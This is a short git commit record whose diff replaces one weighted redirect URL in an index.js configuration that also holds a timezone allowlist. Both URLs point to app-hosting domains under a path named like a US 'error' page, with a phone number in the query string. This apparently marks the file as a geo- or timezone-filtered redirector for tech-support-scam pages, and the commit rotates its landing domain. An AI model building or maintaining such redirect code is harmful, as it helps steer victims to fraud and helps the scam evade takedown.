c655638d1ae84adc061368006aedc8e9cf554883
paalakash <palaksh452@gmail.com>
2026-06-25 06:22:29 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://stingray-app-qiil8.ondigitalocean.app/werrx01USAHTML/?bcda=1800-875-524", weight: 1.0 }
+    { url: "https://sea-turtle-app-qn5tv.ondigitalocean.app/werrx01USAHTML/?bcda=1800-875-524", weight: 1.0 }
 
 ];
 
